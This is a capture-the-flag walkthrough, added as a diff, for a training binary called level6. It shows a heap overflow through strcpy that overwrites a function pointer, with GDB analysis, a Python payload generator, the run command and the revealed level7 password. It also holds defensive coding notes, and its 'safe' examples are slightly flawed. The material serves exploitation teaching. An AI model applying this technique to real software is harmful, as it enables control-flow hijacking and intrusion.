@@ -1,0 +1,315 @@
+# Level6 Walkthrough - Step-by-Step Heap Exploitation
+
+## Quick Summary
+Level6 exploits a heap buffer overflow vulnerability to overwrite a function pointer, redirecting execution from a function that prints "Nope" to one that executes system() and reveals the flag.
+
+## Step-by-Step Exploitation Process
+
+### Step 1: Initial Analysis and Behavior Understanding
+
+```bash
+# Check file properties
+file level6
+ls -la level6
+
+# Test basic behavior
+./level6
+# Result: Segmentation fault (no arguments provided)
+
+./level6 "test"  
+# Result: "Nope" (normal execution path)
+
+./level6 "AAAABBBBCCCCDDDD"
+# Result: "Nope" (still normal - need longer input)
+```
+
+**Key observations:**
+- Program expects command line argument (argv[1])
+- Normal execution prints "Nope"
+- Segfault with no args suggests pointer dereference issue
+
+### Step 2: Binary Analysis with GDB
+
+```bash
+gdb level6
+(gdb) info functions
+# Found: main, m, n functions plus standard library functions
+
+(gdb) disas main
+# Analysis reveals:
+# - Two malloc() calls: malloc(64) and malloc(4)  
+# - strcpy() call with user input
+# - Indirect function call: call *%eax
+
+(gdb) disas m
+# Function m prints "Nope" - this is the default function
+
+(gdb) disas n  
+# Function n calls system() - this is our target!
+```
+
+**Critical discoveries:**
+- **Two heap allocations**: 64 bytes + 4 bytes
+- **Vulnerable strcpy()**: No bounds checking on user input
+- **Function pointer call**: Program calls whatever address is stored
+- **Two functions available**: m() (default) and n() (target with system())
+
+### Step 3: Understanding the Program Logic
+
+**Reconstructed program flow:**
+```c
+int main(int argc, char **argv) {
+    char *buffer1 = malloc(64);      // First heap allocation
+    void (**funcptr)() = malloc(4);  // Second heap allocation
+    
+    *funcptr = m;                    // Initialize to function m()
+    strcpy(buffer1, argv[1]);        // VULNERABLE: Copy user input
+    (*funcptr)();                    // Call function pointer
+}
+```
+
+**The vulnerability:**
+- strcpy() copies ALL of argv[1] into 64-byte buffer
+- If argv[1] > 64 bytes, it overflows into adjacent heap memory
+- The function pointer is stored right after buffer1 in heap
+- We can overwrite the function pointer!
+
+### Step 4: Memory Layout Analysis
+
+**Heap memory layout after malloc() calls:**
+```
+Memory Layout:
+┌─────────────────┬──────────────┬─────────────────┐
+│   buffer1       │ heap metadata │    funcptr     │
+│   (64 bytes)    │  (~8 bytes)   │   (4 bytes)    │
+│   strcpy dest   │   chunk info  │  points to m() │
+└─────────────────┴──────────────┴─────────────────┘
+
+strcpy overflow direction: ──────────────────────────────>
+```
+
+**Key measurements:**
+- **buffer1 size**: 64 bytes
+- **Heap metadata**: ~8 bytes (typical malloc chunk header)
+- **Total offset to funcptr**: 64 + 8 = 72 bytes
+
+### Step 5: Target Address Identification
+
+```bash
+gdb level6
+(gdb) print m
+# $1 = {<text variable, no debug info>} 0x8048468 <m>
+
+(gdb) print n
+# $2 = {<text variable, no debug info>} 0x8048454 <n>
+```
+
+**Function addresses:**
+- **m() function**: 0x08048468 (default - prints "Nope")
+- **n() function**: 0x08048454 (target - calls system())
+
+**Goal**: Overwrite function pointer to change from 0x08048468 → 0x08048454
+
+### Step 6: Exploit Payload Construction
+
+**Payload structure:**
+```
+[72 bytes padding] + [4 bytes target address]
+    │                      │
+    └─ Fill buffer + heap  └─ Address of function n()
+       metadata to reach
+       function pointer
+```
+
+**Python exploit construction:**
+```python
+#!/usr/bin/env python2
+import struct
+
+# Target addresses
+n_function = 0x08048454      # Function n() with system()
+m_function = 0x08048468      # Function m() with "Nope"
+
+# Payload construction  
+offset = 72                                    # Bytes to reach funcptr
+padding = "A" * offset                         # Overflow padding
+target_address = struct.pack("<L", n_function) # n() address (little-endian)
+
+payload = padding + target_address
+print payload
+```
+
+### Step 7: Understanding the Attack Mechanism
+
+**What happens when exploit runs:**
+
+1. **malloc(64)** → Creates buffer1 on heap
+2. **malloc(4)** → Creates funcptr storage adjacent to buffer1  
+3. **funcptr = m** → Function pointer initially set to 0x08048468
+4. **strcpy(buffer1, argv[1])** → Copies our 76-byte payload:
+   - Bytes 1-64: Fill buffer1 completely
+   - Bytes 65-72: Overwrite heap metadata  
+   - Bytes 73-76: Overwrite funcptr with 0x08048454
+5. **(*funcptr)()** → Now calls n() instead of m()!
+6. **Function n()** → Executes system("/bin/cat /home/user/level7/.pass")
+
+### Step 8: Memory State Visualization
+
+**Before exploit (normal state):**
+```
+Heap Memory:
+┌─────────────────┬──────────────┬─────────────────┐
+│     empty       │ heap headers │   0x08048468   │ ← Points to m()
+│   (buffer1)     │              │   (funcptr)    │
+└─────────────────┴──────────────┴─────────────────┘
+```
+
+**After exploit (corrupted state):**
+```
+Heap Memory:  
+┌─────────────────┬──────────────┬─────────────────┐
+│ AAAA...AAAA     │ AAAAAAAA     │   0x08048454   │ ← Now points to n()!
+│ (72 A's)        │ (overwritten)│   (hijacked!)  │
+└─────────────────┴──────────────┴─────────────────┘
+```
+
+### Step 9: Execution and Success
+
+```bash
+# Run the exploit
+./level6 $(python exploit.py)
+
+# Expected result:
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+# What happened:
+# ✓ No "Nope" output (m() function was bypassed)
+# ✓ Flag displayed (n() function was called instead) 
+# ✓ system() executed with level7 privileges
+```
+
+**Success verification:**
+- **No segfault**: Correct offset calculation
+- **No "Nope"**: Successfully bypassed m() function
+- **Flag output**: Successfully redirected to n() function
+
+### Step 10: Why This Attack Worked
+
+**Critical success factors:**
+
+1. **Predictable heap layout**: malloc() allocations are adjacent and predictable
+2. **No bounds checking**: strcpy() blindly copies entire input
+3. **Function pointer usage**: Program actually calls the pointer we control
+4. **Existing functionality**: Function n() already contains the system() call we need
+5. **Precise offset**: Exactly 72 bytes to reach the function pointer
+
+## Technical Deep Dive
+
+### Heap Exploitation vs Stack Exploitation
+
+**Key differences from stack overflows:**
+- **Memory location**: Heap (runtime allocated) vs Stack (automatic)
+- **Target data**: Function pointer vs return address
+- **Metadata**: Heap chunks have management headers
+- **Predictability**: Often more predictable than stack layout
+
+### Why 72 Bytes Exactly?
+
+**Offset calculation breakdown:**
+```
+buffer1:        64 bytes (malloc(64))
+heap metadata:   8 bytes (chunk header/footer)
+-----------------------------------------
+Total:          72 bytes to reach funcptr
+```
+
+**Heap chunk structure (simplified):**
+```
+┌─────────────┬─────────────┬─────────────┐
+│ prev_size   │    size     │   user_data │
+│  (4 bytes)  │  (4 bytes)  │  (64 bytes) │
+└─────────────┴─────────────┴─────────────┘
+```
+
+### Function Pointer Hijacking Technique
+
+**Why this method is elegant:**
+- **No shellcode needed**: Use existing function n()
+- **No ROP chain required**: Single function redirect
+- **Minimal payload**: Just 76 bytes total
+- **Reliable**: Predictable heap layout ensures consistency
+
+## Key Learning Points
+
+### Heap Memory Concepts
+1. **Dynamic allocation**: malloc() creates chunks at runtime
+2. **Adjacent placement**: Consecutive allocations are typically adjacent  
+3. **Metadata presence**: Heap chunks include management information
+4. **Overflow potential**: Buffer overflows can corrupt adjacent chunks
+
+### Function Pointer Security
+1. **Indirect call vulnerability**: Any `call *register` is potentially exploitable
+2. **Control flow hijacking**: Redirecting execution without code injection
+3. **Code reuse**: Leveraging existing functions more stealthy than shellcode
+4. **Validation importance**: Function pointers should be validated before use
+
+### Exploitation Methodology  
+1. **Binary analysis**: Understanding program structure and vulnerabilities
+2. **Memory layout discovery**: Calculating exact offsets for corruption
+3. **Target identification**: Finding existing code to reuse (function n)
+4. **Payload engineering**: Crafting precise input for reliable exploitation
+
+## Defensive Programming Lessons
+
+### Vulnerable Code Patterns
+```c
+// DANGEROUS - No bounds checking
+strcpy(dest, src);
+
+// DANGEROUS - Function pointer without validation  
+(*funcptr)();
+```
+
+### Secure Alternatives
+```c
+// SAFE - Bounded copying
+strncpy(dest, src, sizeof(dest)-1);
+dest[sizeof(dest)-1] = '\0';
+
+// SAFE - Function pointer validation
+if (funcptr >= min_addr && funcptr <= max_addr) {
+    (*funcptr)();
+}
+```
+
+## Tools and Techniques Used
+
+### Analysis Tools
+- **GDB**: Function discovery, address identification, memory analysis
+- **file**: Binary type and architecture identification
+- **objdump/readelf**: Optional for deeper binary analysis
+
+### Exploitation Tools
+- **Python**: Payload generation and binary data construction
+- **struct.pack()**: Little-endian address encoding
+- **Command line**: Argument passing for exploit delivery
+
+## Flag and Next Steps
+**Level7 Password**: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
+
+**Progression command:**
+```bash
+su level7
+# Enter password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+## Conclusion
+Level6 demonstrates advanced heap exploitation requiring understanding of:
+- Dynamic memory management and heap chunk structure
+- Function pointer hijacking for control flow redirection
+- Precise memory layout analysis for reliable exploitation  
+- Binary reverse engineering for vulnerability discovery
+
+This represents a significant step up in binary exploitation complexity, introducing heap-based attacks and function pointer manipulation. The technique showcases elegant code reuse methodology, avoiding complex shellcode injection in favor of leveraging existing program functionality.
+
+The skills learned here—heap memory analysis, precise offset calculation, and function pointer hijacking—form the foundation for advanced binary exploitation techniques used in modern security research and penetration testing.
